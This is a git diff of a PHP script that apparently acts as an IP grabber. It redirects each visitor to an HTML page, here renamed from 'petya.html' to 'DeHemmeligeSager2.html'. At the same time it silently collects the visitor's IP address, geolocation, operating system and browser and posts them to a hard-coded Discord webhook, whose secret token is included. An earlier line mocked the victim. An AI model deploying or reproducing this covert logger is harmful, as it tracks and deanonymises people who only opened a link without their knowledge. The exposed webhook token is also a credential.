@@ -1,5 +1,5 @@
 <?php
-header( 'Location: petya.html' ) ;
+header( 'Location: DeHemmeligeSager2.html' ) ;
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
@@ -87,7 +87,7 @@ else{
 $ipdat = @json_decode(file_get_contents( 
     "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
 $time = date('Y-m-d H:i:s');
-$make_json = json_encode(array('content'=>"Petya  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone |ur Fucking ip is $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
+$make_json = json_encode(array('content'=>"Hemmelige sager 2  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
 $exec = curl_init("https://discordapp.com/api/webhooks/783278384377102388/eRFWws-eeOKdRft9rz54bbX5_uoYa84-ViqU23zWB1QWtZvQcwNJayOnPPkDmFTL4WCY");
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
